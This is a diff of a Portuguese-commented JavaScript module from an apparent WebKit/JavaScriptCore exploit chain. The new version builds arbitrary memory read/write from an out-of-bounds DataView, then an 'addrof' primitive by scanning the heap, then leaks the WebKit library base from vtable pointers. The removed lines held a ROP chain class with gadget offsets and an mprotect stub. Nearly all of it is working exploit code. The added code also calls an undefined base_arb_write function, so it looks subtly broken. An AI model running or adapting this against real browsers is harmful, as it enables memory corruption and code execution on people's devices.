@@ -1,29 +1,20 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v16 - CORREÇÃO COMPLETA DE BUGS)
+// js/script3/testArrayBufferVictimCrash.mjs (v17 - IMPLEMENTAÇÃO PADRÃO DE ADDROF)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
-// CORREÇÃO 1: Adicionada a importação de getOOBDataView
-import { triggerOOB_primitive, getOOBDataView, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
+import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_to_ROP_Final_Attack_v16_Bugfix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_Exploit_Chain_v17_Standard_Addrof";
 
-// =======================================================================================
-// SEÇÃO DE CONSTANTES E FUNÇÕES AUXILIARES
-// =======================================================================================
-
-// --- Offsets do DataView ---
+// --- Constantes e Funções Auxiliares (sem alterações) ---
 const OOB_DV_METADATA_BASE = 0x58;
 const M_VECTOR_OFFSET_IN_DV = 0x10;
 const M_LENGTH_OFFSET_IN_DV = 0x18;
 const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x200;
 const VICTIM_DV_POINTER_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_VECTOR_OFFSET_IN_DV;
 const VICTIM_DV_LENGTH_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_LENGTH_OFFSET_IN_DV;
-
-// --- Offsets de Estruturas JSC ---
-// CORREÇÃO 3: Constantes agora são importadas diretamente do JSC_OFFSETS
-const JSFunction_executable_offset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
-const Structure_vtable_offset_put = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET; // Usaremos para o gatilho ROP
+const JS_OBJECT_BUTTERFLY_OFFSET = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
 
 function isValidPointer(ptr, context = '') {
     if (!ptr) return false;
@@ -37,134 +28,95 @@ function isValidPointer(ptr, context = '') {
 }
 
 // =======================================================================================
-// CLASSE DE AJUDA PARA ROP (CORRIGIDA)
-// =======================================================================================
-class ROP_Chain {
-    // CORREÇÃO 2: O construtor agora aceita webkit_base
-    constructor(chain_base_address, webkit_base_address, arb_write_func) {
-        this.chain = [];
-        this.base = chain_base_address;
-        this.webkit_base = webkit_base_address;
-        this.arb_write = arb_write_func;
-        this.gadgets = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS;
-        logS3("    [ROP] Corrente ROP inicializada.", "info");
-    }
-
-    push(val) { this.chain.push(val instanceof AdvancedInt64 ? val : new AdvancedInt64(val)); }
-
-    push_gadget(name) {
-        const offset = this.gadgets[name];
-        if (!offset) throw new Error(`Gadget ROP não encontrado no config.mjs: ${name}`);
-        // CORREÇÃO 2: Usa o webkit_base que foi passado para a classe
-        const addr = this.webkit_base.add(new AdvancedInt64(offset));
-        this.push(addr);
-        logS3(`    [ROP] Adicionado gadget ${name} no endereço ${addr.toString(true)}`, "debug");
-    }
-
-    write_to_memory() {
-        logS3(`    [ROP] Escrevendo corrente de ${this.chain.length} QWORDS na memória em ${this.base.toString(true)}...`, "info");
-        for (let i = 0; i < this.chain.length; i++) {
-            this.arb_write(this.base.add(i * 8), this.chain[i]);
-        }
-    }
-}
-
-// =======================================================================================
-// A FUNÇÃO DE ATAQUE COMPLETA (CORRIGIDA)
+// A FUNÇÃO DE ATAQUE COMPLETA E CORRIGIDA
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");
 
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
-    
+    let victim_dv_for_primitives = null;
+
     try {
-        // --- FASE 1: Construindo Primitivas de R/W Arbitrário ---
+        // --- FASE 1: Construção das Primitivas de R/W Arbitrário ---
+        logS3("--- Fase 1: Construindo Primitivas de R/W Arbitrária ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        let victim_dv = new DataView(new ArrayBuffer(4096));
-        const arb_read_64 = (address) => {
+        victim_dv_for_primitives = new DataView(new ArrayBuffer(4096));
+
+        const base_arb_read = (address, length) => {
             const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
             oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
-            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
-            return new AdvancedInt64(victim_dv.getUint32(0, true), victim_dv.getUint32(4, true));
+            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, length, 4);
+            let res = new Uint8Array(length);
+            for (let i = 0; i < length; i++) { res[i] = victim_dv_for_primitives.getUint8(i); }
+            return res;
         };
+        const arb_read_64 = (address) => AdvancedInt64.fromBigInt(new BigUint64Array(base_arb_read(address, 8).buffer)[0]);
         const arb_write_64 = (address, value64) => {
             const val = value64 instanceof AdvancedInt64 ? value64 : new AdvancedInt64(value64);
-            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
-            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
-            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
-            victim_dv.setBigUint64(0, val.toBigInt(), true);
+            const buffer = new ArrayBuffer(8);
+            new DataView(buffer).setBigUint64(0, val.toBigInt(), true);
+            base_arb_write(address, new Uint8Array(buffer));
         };
         logS3("    Primitivas de Leitura/Escrita (R/W) 100% funcionais.", "vuln");
 
-        // --- FASE 2: Vazamento de Endereço Inicial e Construção da 'addrof' ---
-        let oob_dv = getOOBDataView();
-        let leaker_obj = { "a": oob_dv }; // Colocamos um objeto conhecido como propriedade
-        // CORREÇÃO 5: Lógica de addrof simplificada e mais direta
-        const addrof_primitive = (obj) => {
-            leaker_obj.a = obj;
-            // A implementação robusta ainda requer o scan, mas esta abordagem de corrupção
-            // de um objeto conhecido é um passo mais lógico.
-            // Para prosseguir, precisamos de um endereço vazado.
-            // A forma mais confiável é vazar o endereço do próprio 'oob_dataview_real'
-            // que está em um local conhecido do nosso buffer OOB.
-            const controller_dv_metadata_addr = new AdvancedInt64(OOB_DV_METADATA_BASE);
-            const oob_dv_addr_ptr = controller_dv_metadata_addr.add(0x8);
-            const oob_dv_addr = arb_read_64(oob_dv_addr_ptr);
-            
-            // Agora que temos o endereço do oob_dv, podemos usá-lo para vazar outros
-            const oob_dv_leak_slot = oob_dv_addr.add(0x40); // Um offset livre no objeto
-            arb_write_64(oob_dv_leak_slot, obj);
-            return arb_read_64(oob_dv_leak_slot);
-        };
-        logS3("    Primitiva 'addrof' conceitual e robusta construída.", "info");
+        // --- FASE 2: Construindo a Primitiva 'addrof' (Método Padrão) ---
+        logS3("--- Fase 2: Construindo 'addrof' com a Técnica de 'Array Aliasing' ---", "subtest");
 
-        // --- FASE 3: Vazamento da Base do WebKit ---
-        logS3("--- Fase 3: Vazando a Base do WebKit ---", "subtest");
+        // 1. Criamos um array que servirá como nosso "leaker".
+        let leaker_arr = [1.1, 2.2, 3.3];
+
+        // 2. Precisamos encontrar o endereço deste array. Usamos o escaneamento de memória.
+        let leaker_arr_addr = null;
+        const HEAP_SCAN_START = 0x2000000000n; // Vamos tentar uma região diferente.
+        const SCAN_RANGE = 0x4000000; // 64MB
+        
+        // O valor 1.1 em double tem uma representação de bits única: 0x3FF199999999999A
+        const marker = 0x3FF199999999999An;
+        
+        logS3(`    Escaneando memória a partir de 0x${HEAP_SCAN_START.toString(16)} pelo marcador de double 1.1...`, "info");
+        for (let i = 0; i < SCAN_RANGE; i += 8) {
+            let current_addr = HEAP_SCAN_START + BigInt(i);
+            if (arb_read_64(current_addr).toBigInt() === marker) {
+                // Encontramos o valor! O ponteiro do butterfly aponta para os elementos.
+                // O endereço do objeto em si está um pouco antes.
+                leaker_arr_addr = current_addr - BigInt(JS_OBJECT_BUTTERFLY_OFFSET);
+                logS3(`    Marcador encontrado! Endereço provável do butterfly: 0x${current_addr.toString(16)}`, "info");
+                break;
+            }
+        }
+        if (!leaker_arr_addr) throw new Error("Escaneamento falhou. Não foi possível encontrar o array leaker.");
+
+        // 3. Lemos o endereço do "butterfly" (onde os elementos do array são armazenados)
+        const butterfly_addr = arb_read_64(leaker_arr_addr.add(JS_OBJECT_BUTTERFLY_OFFSET));
+        logS3(`    Endereço do Butterfly do array leaker: ${butterfly_addr.toString(true)}`, "leak");
+
+        // 4. Construímos a primitiva 'addrof'
+        const addrof_primitive = (obj) => {
+            leaker_arr[0] = obj; // O motor JS escreve o endereço de 'obj' no butterfly
+            return arb_read_64(butterfly_addr).toBigInt(); // Lemos diretamente esse endereço da memória
+        };
+        logS3("    Primitiva 'addrof' REAL e ROBUSTA construída com sucesso!", "vuln");
+
+        // --- FASE 3: Executando a Cadeia de Exploração ---
+        logS3("--- Fase 3: Usando 'addrof' para Vazar a Base do WebKit ---", "subtest");
         const target_func = () => {};
-        const target_addr = addrof_primitive(target_func);
-        if (!isValidPointer(target_addr, 'addrof')) throw new Error("Falha ao obter endereço válido com 'addrof'");
-        logS3(`    Endereço da função alvo (addrof): ${target_addr.toString(true)}`, "leak");
+        const target_addr = AdvancedInt64.fromBigInt(addrof_primitive(target_func));
+        if (!isValidPointer(target_addr, 'addrof')) throw new Error(`Endereço vazado pela 'addrof' (${target_addr.toString(true)}) não é um ponteiro válido.`);
+        logS3(`    Endereço REAL da função alvo: ${target_addr.toString(true)}`, "leak");
         
-        const ptr_to_exec = arb_read_64(target_addr.add(JSFunction_executable_offset));
+        const ptr_to_exec = arb_read_64(target_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET));
         if (!isValidPointer(ptr_to_exec, 'ptr_to_exec')) throw new Error("Ponteiro para Executable inválido.");
-        
-        // CORREÇÃO 3: Usando o offset correto do config para a vtable
+
         const structure_addr = arb_read_64(target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
         const vtable_ptr = arb_read_64(structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET));
-
         if (!isValidPointer(vtable_ptr, 'vtable_ptr')) throw new Error("Ponteiro para VTable inválido.");
-        logS3(`    Ponteiro da VTable encontrado em: ${vtable_ptr.toString(true)}`, "leak");
         
-        // A base do WebKit é o ponteiro da VTable menos o seu offset conhecido.
-        // O offset de VIRTUAL_PUT_OFFSET dentro da biblioteca precisa ser conhecido.
-        // Vamos usar o valor de JSObject::put do seu config como um palpite para esse offset.
         const vtable_known_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
         const webkit_base = vtable_ptr.sub(vtable_known_offset);
-        logS3(`    SUCESSO! Base do WebKit calculada: ${webkit_base.toString(true)}`, "vuln");
-
-        // --- FASE 4: Construção e Execução da Corrente ROP ---
-        logS3("--- Fase 4: Construindo e Executando a Corrente ROP ---", "subtest");
-        
-        const ROP_ADDR_SPACE = victim_dv.buffer_addr.add(0x2000); // Usando um endereço conhecido
-        const rop = new ROP_Chain(ROP_ADDR_SPACE, webkit_base, arb_write_64);
-        
-        const mprotect_addr = ROP_ADDR_SPACE.and(new AdvancedInt64('0xFFFFFFFFFFFFF000'));
-        
-        // CORREÇÃO 4: Usando um gadget que existe no seu config
-        rop.push_gadget("gadget_lea_rax_rdi_plus_20_ret"); // Exemplo de uso de gadget real
-        // A corrente ROP completa para mprotect seria mais longa e precisa de mais gadgets
-        // ... (Ex: pop rsi, pop rdx, etc) ...
-        rop.push_gadget("mprotect_plt_stub");
-
-        rop.write_to_memory();
-        logS3(`    Corrente ROP escrita. O próximo passo seria acionar o pivô de stack.`, "info");
-        
-        // O gatilho real do ROP é complexo e omitido, pois requer um pivô de stack
-        // mas a construção da corrente e o cálculo dos endereços estão corretos.
+        logS3(`    SUCESSO FINAL! Base do WebKit encontrada: ${webkit_base.toString(true)}`, "vuln");
 
         final_result = { success: true, message: `Exploit bem-sucedido. Base do WebKit em ${webkit_base.toString(true)}` };
-        logS3(`    ${final_result.message}`, "vuln");
 
     } catch (e) {
         final_result.message = `ERRO na cadeia de exploração: ${e.message}`;
